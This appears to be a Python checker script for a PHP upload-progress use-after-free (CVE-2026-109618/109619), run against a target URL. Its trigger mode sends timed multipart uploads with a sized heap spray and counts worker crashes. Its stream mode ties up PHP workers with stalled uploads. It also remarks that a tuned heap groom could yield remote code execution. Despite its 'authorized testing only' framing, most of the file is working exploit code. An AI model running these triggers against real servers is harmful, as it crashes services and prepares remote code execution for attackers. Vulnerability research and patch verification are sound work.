#!/usr/bin/env python3
"""
php2shell_check.py — all-in-one vulnerability checker for CVE-2026-109618 / 109619
(php2shell: heap use-after-free in PHP session.upload_progress handler).

Combines four non-destructive tests against a remote PHP target:

  probe   Benign fingerprint: headers, PHP detection, multipart with
          PHP_SESSION_UPLOAD_PROGRESS, Set-Cookie / response inspection.
  trigger UAF trigger: multi-phase multipart upload with stalls > min_freq
          between FILE_DATA chunks, optional heap spray and multi-stall.
          Crash oracle: 5xx / connection reset on the POST, plus a health
          GET after every round.
  lock    Session-lock oracle: while an upload with PHP_SESSION_UPLOAD_PROGRESS
          is stalled, a concurrent request with the same PHPSESSID should block
          on the session flock IF the rfc1867 handler initialized the session
          mid-parse. A control run without the progress field must be fast.
  stream  Worker-occupancy oracle: N stalled uploads (> PHP_FCGI_CHILDREN)
          plus a probe GET mid-stall. Fast GET => front-end buffers the
          request body (stall never reaches PHP) => UAF not reachable.
          Slow GET (~stall) => front-end streams => UAF path reachable.

Modes can be run individually or all together (--mode all, the default).
The tool does NOT drop webshells or run commands on the target: it only
checks whether the preconditions for the UAF are present.

Usage:
  python3 php2shell_check.py --url https://www.example.com/index.php
  python3 php2shell_check.py --url https://www.example.com/index.php --mode probe
  python3 php2shell_check.py --url https://www.example.com/index.php --mode trigger --rounds 5 --spray 16 --stalls 3
  python3 php2shell_check.py --url https://www.example.com/index.php --mode lock
  python3 php2shell_check.py --url https://www.example.com/index.php --mode stream --conns 12 --stream-stall 6
  python3 php2shell_check.py --url https://www.example.com/index.php --no-verify   # self-signed TLS labs

For authorized security testing only.
"""

import argparse
import os
import socket
import ssl
import threading
import time
import uuid
import urllib.parse

FILLUNIT = 5120  # rfc1867.c read-buffer size
BOUNDARY = b"----0x4148php2shell"
PROGRESS_KEY = "vuln_test"


# ─── connection helpers ──────────────────────────────────────────────────

def make_ssl_ctx(verify=True):
    ctx = ssl.create_default_context()
    if not verify:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return ctx


def open_conn(host, port, use_tls, verify=True, timeout=20.0):
    raw = socket.create_connection((host, port), timeout=timeout)
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    if use_tls:
        return make_ssl_ctx(verify).wrap_socket(raw, server_hostname=host)
    return raw


def send_all(sock, data):
    view = memoryview(data)
    sent = 0
    while sent < len(data):
        n = sock.send(view[sent:])
        if n == 0:
            raise ConnectionError("socket closed during send")
        sent += n


def recv_all(sock, timeout=10.0):
    """Returns (bytes, error_tag_or_None)."""
    sock.settimeout(timeout)
    parts = []
    while True:
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            break
        except (ConnectionResetError, ssl.SSLError) as e:
            return b"".join(parts), f"reset:{e.__class__.__name__}"
        if not chunk:
            break
        parts.append(chunk)
    return b"".join(parts), None


def http_status(raw):
    """Returns (code, status_line)."""
    if b"\r\n" not in raw:
        return 0, ""
    line = raw.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    p = line.split(" ", 2)
    code = int(p[1]) if len(p) >= 2 and p[1].isdigit() else 0
    return code, line


def health_get(cfg):
    """Plain GET; returns (ok, info_str, elapsed)."""
    t0 = time.time()
    try:
        s = open_conn(cfg.host, cfg.port, cfg.tls, cfg.verify, timeout=12)
        send_all(s, (f"GET {cfg.path} HTTP/1.1\r\nHost: {cfg.host}\r\n"
                     f"Connection: close\r\n\r\n").encode())
        raw, err = recv_all(s, timeout=12)
        s.close()
        code, line = http_status(raw)
        el = time.time() - t0
        if err:
            return False, err, el
        return code == 200, f"HTTP {code}", el
    except Exception as e:
        return False, f"{e.__class__.__name__}: {e}", time.time() - t0


# ─── multipart builders ──────────────────────────────────────────────────

def build_trigger_phases(sid, spray_count, n_stalls, with_progress=True):
    """Multipart body split into phases; a stall is inserted between phases.

    Phase 1 arms the cached zval* pointers (FILE_START + FILE_DATA).
    Every subsequent phase is sent after a stall > session.upload_progress.min_freq,
    re-triggering update() -> initialize() -> track_init() -> stale write.
    """
    buf = b""
    buf += b"--" + BOUNDARY + b"\r\n"
    buf += b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' + sid.encode() + b"\r\n"
    if with_progress:
        buf += b"--" + BOUNDARY + b"\r\n"
        buf += (b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"'
                b"\r\n\r\n" + PROGRESS_KEY.encode() + b"\r\n")

    # Heap spray: 231-char filenames => 256-byte zend_strings, same ZendMM bin
    # as the 8-bucket session HashTable arData (8 x 32-byte Bucket).
    spray_fname = b"S" * 231
    for i in range(spray_count):
        buf += b"--" + BOUNDARY + b"\r\n"
        buf += (b'Content-Disposition: form-data; name="spray_' + str(i).encode() +
                b'"; filename="' + spray_fname + b'"\r\n')
        buf += b"Content-Type: application/octet-stream\r\n\r\n"
        buf += b"X" * 4 + b"\r\n"

    buf += b"--" + BOUNDARY + b"\r\n"
    buf += b'Content-Disposition: form-data; name="file"; filename="poc.bin"\r\n'
    buf += b"Content-Type: application/octet-stream\r\n\r\n"

    phases = [buf + os.urandom(FILLUNIT + 128)]
    for i in range(n_stalls):
        phases.append(os.urandom(FILLUNIT * 2))
    phases.append(b"\r\n--" + BOUNDARY + b"--\r\n")
    return phases


def post_request_head(cfg, sid, total, chunked=False):
    return (f"POST {cfg.path} HTTP/1.1\r\nHost: {cfg.host}\r\n"
            f"Cookie: PHPSESSID={sid}\r\n"
            f"Content-Type: multipart/form-data; boundary={BOUNDARY.decode()}\r\n"
            f"Content-Length: {total}\r\nConnection: close\r\n\r\n").encode()


# ─── mode: probe (benign fingerprint) ────────────────────────────────────

def mode_probe(cfg):
    print("\n[PROBE] Benign fingerprint")
    ok, info, el = health_get(cfg)
    print(f"  GET {cfg.path}: {'OK' if ok else 'FAIL'} ({info}, {el:.2f}s)")
    if not ok:
        return {"reachable": False}

    sid = uuid.uuid4().hex
    phases = build_trigger_phases(sid, spray_count=0, n_stalls=0)
    total = sum(len(p) for p in phases)
    s = open_conn(cfg.host, cfg.port, cfg.tls, cfg.verify)
    send_all(s, post_request_head(cfg, sid, total) + b"".join(phases))
    raw, err = recv_all(s)
    s.close()
    code, line = http_status(raw)
    setcookie = b"set-cookie" in raw.lower()
    body = raw.split(b"\r\n\r\n", 1)[-1][:200]
    print(f"  Fast multipart POST: {line or err}")
    print(f"  Set-Cookie in response: {'yes' if setcookie else 'no'}")
    if body:
        print(f"  Body (start): {body[:120]!r}")
    return {"reachable": True, "post_status": code, "set_cookie": setcookie}


# ─── mode: trigger (UAF + crash oracle) ──────────────────────────────────

def trigger_once(cfg, stall, spray, n_stalls, verbose):
    sid = uuid.uuid4().hex
    phases = build_trigger_phases(sid, spray, n_stalls)
    total = sum(len(p) for p in phases)

    t0 = time.time()
    try:
        sock = open_conn(cfg.host, cfg.port, cfg.tls, cfg.verify)
        send_all(sock, post_request_head(cfg, sid, total) + phases[0])
        if verbose:
            print(f"    [>] phase 1 sent ({len(phases[0])}B) — pointers armed")
        for i, phase in enumerate(phases[1:]):
            time.sleep(stall)  # > min_freq: track_init() frees arData
            send_all(sock, phase)
            if verbose:
                print(f"    [>] phase {i+2} sent after {stall}s stall — stale write")
        raw, recv_err = recv_all(sock)
        sock.close()
    except (ConnectionResetError, BrokenPipeError, ssl.SSLError) as e:
        return {"sid": sid, "code": 0, "line": f"reset:{e.__class__.__name__}",
                "elapsed": time.time() - t0, "crashed": True}

    code, line = http_status(raw)
    crashed = recv_err is not None or code in (0, 500, 502, 503)
    return {"sid": sid, "code": code, "line": line or (recv_err or "no response"),
            "elapsed": time.time() - t0, "crashed": crashed}


def mode_trigger(cfg, args):
    print(f"\n[TRIGGER] UAF trigger: {args.rounds} rounds, stall {args.stall}s, "
          f"stalls/round {args.stalls}, spray {args.spray}")
    crashes = 0
    for i in range(1, args.rounds + 1):
        r = trigger_once(cfg, args.stall, args.spray, args.stalls, args.verbose)
        ok, info, _ = health_get(cfg)
        crashed = r["crashed"] or not ok
        if crashed:
            crashes += 1
        marker = "  <-- CRASH SIGNAL" if crashed else ""
        print(f"  round {i}: POST status={r['code']} ({r['line']}) t={r['elapsed']:.2f}s | "
              f"health GET: {'OK' if ok else 'FAIL'} ({info}){marker}")
        time.sleep(0.5)

    print(f"  => {crashes}/{args.rounds} rounds with crash signals")
    if crashes:
        print("  => Memory corruption observable: vulnerable path REACHED")
    else:
        print("  => No crashes (silent write, stall not reaching PHP, or mitigated)")
    return {"crashes": crashes, "rounds": args.rounds}


# ─── mode: lock (session-lock oracle) ────────────────────────────────────

def _stalled_upload(cfg, sid, with_progress, stall, done_evt):
    phases = build_trigger_phases(sid, spray_count=0, n_stalls=0,
                                  with_progress=with_progress)
    total = sum(len(p) for p in phases)
    try:
        s = open_conn(cfg.host, cfg.port, cfg.tls, cfg.verify, timeout=stall + 20)
        send_all(s, post_request_head(cfg, sid, total) + phases[0])
        time.sleep(stall)
        done_evt.set()
        send_all(s, phases[-1])
        recv_all(s, timeout=10)
        s.close()
    except Exception:
        done_evt.set()


def _concurrent_post(cfg, sid):
    body = b"username=a&password=b"
    req = (f"POST {cfg.path} HTTP/1.1\r\nHost: {cfg.host}\r\n"
           f"Cookie: PHPSESSID={sid}\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
    t0 = time.time()
    try:
        s = open_conn(cfg.host, cfg.port, cfg.tls, cfg.verify, timeout=25)
        send_all(s, req)
        recv_all(s, timeout=25)
        s.close()
    except Exception:
        pass
    return time.time() - t0


def _lock_case(cfg, label, with_progress, stall):
    sid = uuid.uuid4().hex
    done_evt = threading.Event()
    t = threading.Thread(target=_stalled_upload,
                         args=(cfg, sid, with_progress, stall, done_evt), daemon=True)
    t.start()
    time.sleep(1.5)  # let the upload settle into the stall
    elapsed = _concurrent_post(cfg, sid)
    done_evt.set()
    t.join(timeout=stall + 15)
    expected = stall - 1.5
    locked = elapsed > expected * 0.7
    print(f"  [{label}] concurrent POST: {elapsed:.2f}s "
          f"(~{expected:.1f}s expected if locked) -> {'LOCK HELD' if locked else 'no lock'}")
    return locked


def mode_lock(cfg, args):
    print(f"\n[LOCK] Session-lock oracle (stall {args.lock_stall}s)")
    locked_a = _lock_case(cfg, "with PHP_SESSION_UPLOAD_PROGRESS", True, args.lock_stall)
    locked_b = _lock_case(cfg, "control (no progress field)", False, args.lock_stall)

    if locked_a and not locked_b:
        print("  => rfc1867 upload_progress ACTIVE and stall reaches the PHP process")
        print("  => UAF preconditions PRESENT")
    elif locked_a and locked_b:
        print("  => AMBIGUOUS: lock in both cases (session held by something else)")
    else:
        print("  => No session lock during stall: upload_progress disabled")
        print("     OR request body buffered by the front-end")
    return {"lock_with_progress": locked_a, "lock_control": locked_b}


# ─── mode: stream (worker-occupancy oracle) ──────────────────────────────

def _stream_stalled_upload(cfg, idx, stall, started, release):
    sid = uuid.uuid4().hex
    phases = build_trigger_phases(sid, spray_count=0, n_stalls=0)
    total = sum(len(p) for p in phases)
    try:
        s = open_conn(cfg.host, cfg.port, cfg.tls, cfg.verify, timeout=stall + 25)
        send_all(s, post_request_head(cfg, sid, total) + phases[0])
        started[idx] = True
        release.wait(stall + 15)
        try:
            send_all(s, phases[-1])
            recv_all(s, timeout=6)
        except Exception:
            pass
        s.close()
    except Exception:
        started[idx] = "err"


def mode_stream(cfg, args):
    print(f"\n[STREAM] Worker-occupancy oracle: {args.conns} stalled uploads "
          f"({args.stream_stall}s) + probe GET")

    _, info0, lat0 = health_get(cfg)
    print(f"  Baseline GET: {lat0:.2f}s ({info0})")

    started = [False] * args.conns
    release = threading.Event()
    threads = [threading.Thread(target=_stream_stalled_upload,
                                args=(cfg, i, args.stream_stall, started, release),
                                daemon=True)
               for i in range(args.conns)]
    for t in threads:
        t.start()
        time.sleep(0.05)

    deadline = time.time() + 10
    while time.time() < deadline and not all(started):
        time.sleep(0.1)
    time.sleep(0.5)
    stuck = sum(1 for x in started if x is True)
    print(f"  {stuck}/{args.conns} uploads parked mid-body; probing GET...")

    _, info1, lat1 = health_get(cfg)
    release.set()
    for t in threads:
        t.join(timeout=args.stream_stall + 20)
    time.sleep(0.5)
    _, info2, lat2 = health_get(cfg)
    print(f"  GET during stalls: {lat1:.2f}s ({info1}) | after release: {lat2:.2f}s ({info2})")

    if lat1 >= args.stream_stall * 0.8:
        print(f"  => STREAMING confirmed (GET took ~stall time)")
        print("  => Front-end forwards the body to PHP in real time: UAF REACHABLE")
        verdict = "streaming"
    elif lat1 < args.stream_stall * 0.4:
        print("  => BUFFERING confirmed (workers free during stalls)")
        print("  => PHP only sees the complete body; gap > min_freq never occurs")
        print("     between FILE_DATA events: UAF NOT reachable over HTTP")
        verdict = "buffering"
    else:
        print(f"  => INCONCLUSIVE (latency {lat1:.1f}s) — raise --stream-stall/--conns")
        verdict = "inconclusive"
    return {"front_end": verdict, "lat_baseline": lat0, "lat_during": lat1}


# ─── CLI / orchestration ─────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description="php2shell (CVE-2026-109618/109619) all-in-one vulnerability checker",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "examples:\n"
            "  python3 php2shell_check.py --url https://www.example.com/index.php\n"
            "  python3 php2shell_check.py --url https://www.example.com/index.php --mode trigger --rounds 5 --spray 16 --stalls 3 -v\n"
            "  python3 php2shell_check.py --url https://www.example.com/index.php --mode stream --conns 12 --stream-stall 6\n"
        ),
    )
    ap.add_argument("--url", required=True,
                    help="target PHP URL (e.g. https://www.example.com/index.php)")
    ap.add_argument("--mode", default="all",
                    choices=["all", "probe", "trigger", "lock", "stream"],
                    help="which test(s) to run (default: all)")
    ap.add_argument("--rounds", type=int, default=3, help="trigger rounds (default: 3)")
    ap.add_argument("--stall", type=float, default=1.6,
                    help="stall between phases in trigger mode, > min_freq (default: 1.6)")
    ap.add_argument("--stalls", type=int, default=1,
                    help="stall gaps per trigger round (default: 1)")
    ap.add_argument("--spray", type=int, default=16,
                    help="heap spray parts per round (default: 16)")
    ap.add_argument("--lock-stall", type=float, default=4.0,
                    help="stall used by the lock oracle (default: 4.0)")
    ap.add_argument("--conns", type=int, default=12,
                    help="parallel stalled uploads for the stream test (default: 12)")
    ap.add_argument("--stream-stall", type=float, default=6.0,
                    help="stall duration for the stream test (default: 6.0)")
    ap.add_argument("--no-verify", action="store_true",
                    help="disable TLS certificate verification (labs/self-signed only)")
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()

    parsed = urllib.parse.urlparse(args.url)
    cfg = argparse.Namespace(
        host=parsed.hostname,
        port=parsed.port or (443 if parsed.scheme == "https" else 80),
        tls=parsed.scheme == "https",
        path=(parsed.path or "/") + (("?" + parsed.query) if parsed.query else ""),
        verify=not args.no_verify,
    )

    print("=" * 64)
    print(" php2shell_check — CVE-2026-109618 / CVE-2026-109619 checker")
    print("=" * 64)
    print(f"[*] Target: {args.url}")
    print(f"[*] Mode:   {args.mode}")
    if not cfg.verify:
        print("[!] TLS verification disabled (lab mode)")

    results = {}
    modes = ["probe", "trigger", "lock", "stream"] if args.mode == "all" else [args.mode]
    for m in modes:
        if m == "probe":
            results["probe"] = mode_probe(cfg)
            if not results["probe"].get("reachable"):
                print("\n[!] Target unreachable — aborting remaining tests")
                break
        elif m == "trigger":
            results["trigger"] = mode_trigger(cfg, args)
        elif m == "lock":
            results["lock"] = mode_lock(cfg, args)
        elif m == "stream":
            results["stream"] = mode_stream(cfg, args)

    print("\n" + "=" * 64)
    print("FINAL SUMMARY")
    print("=" * 64)
    if "stream" in results:
        fe = results["stream"]["front_end"]
        print(f"  Front-end behavior : {fe.upper()}")
    if "lock" in results:
        lp = results["lock"]
        print(f"  Session lock oracle: progress={lp['lock_with_progress']} "
              f"control={lp['lock_control']}")
    if "trigger" in results:
        tr = results["trigger"]
        print(f"  Trigger crashes    : {tr['crashes']}/{tr['rounds']}")

    streaming = results.get("stream", {}).get("front_end") == "streaming"
    locked = results.get("lock", {}).get("lock_with_progress") and \
        not results.get("lock", {}).get("lock_control")
    crashed = results.get("trigger", {}).get("crashes", 0) > 0

    print()
    if crashed:
        print("VERDICT: VULNERABLE — memory corruption observed (worker crash).")
    elif streaming and locked:
        print("VERDICT: LIKELY VULNERABLE — stall reaches PHP and upload_progress")
        print("         initializes the session mid-parse; no crash observed yet")
        print("         (silent write). A tuned heap groom could turn this into RCE.")
    elif results.get("stream", {}).get("front_end") == "buffering":
        print("VERDICT: NOT EXPLOITABLE via this vector — the front-end buffers")
        print("         the request body, so the timed stall never reaches PHP.")
        print("         (Defense in depth only: the PHP binary may still carry the")
        print("         bug — patch to >= 8.4.27 or set session.upload_progress.enabled=Off.)")
    else:
        print("VERDICT: INCONCLUSIVE — see per-mode output above.")
    print("=" * 64)


if __name__ == "__main__":
    main()
